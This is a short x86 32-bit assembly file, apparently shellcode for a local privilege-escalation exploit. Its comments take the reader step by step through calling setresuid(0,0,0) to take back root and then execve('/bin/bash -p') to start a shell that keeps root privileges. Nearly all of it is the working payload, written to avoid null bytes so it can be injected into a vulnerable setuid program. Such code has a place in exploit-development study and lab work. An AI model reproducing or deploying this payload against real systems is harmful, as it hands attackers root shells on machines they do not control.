.code32
.globl _start
.section .text

_start:
	#movl	$0xcccccccc, %eax
	#movl	$0xcccccccc, %ebx
	#movl	$0xcccccccc, %ecx
	#movl	$0xcccccccc, %edx
	#movl	$0xcccccccc, %esi
	#movl	$0xcccccccc, %edi
	#movl	$0xcccccccc, %ebp

	xorl	%eax, %eax			# eax = 0
	movb	$164, %al			# eax = 164
	xorl	%ebx, %ebx			# ebx = 0
	xorl	%ecx, %ecx			# ecx = 0
	cltd						# edx = 0
	int		$0x80				# setresuid(0, 0, 0), Revive root privileges.
	pushl	$11
	popl	%eax				# eax = 11
	pushl	$0x68				# h + null character
	pushl	$0x7361622f			# /bas
	push	$0x6e69622f			# /bin
	movl	%esp, %ebx			# ebx(argv[0]) = "/bin/bash"
	pushl	%edx				# null character
	pushw	$0x702d				# -p
	movl	%esp, %ecx			# ecx = "-p"
	pushl	%edx				# null pointer
	movl	%esp, %edx			# edx(envp) = {NULL}
	pushl	%ecx				# "-p"
	pushl	%ebx				# "/bin/bash"
	movl	%esp, %ecx			# ecx(argv) = {"/bin/bash", "-p", NULL}
	int		$0x80				# execve("/bin/bash", ["/bin/bash", "-p", NULL], [NULL])
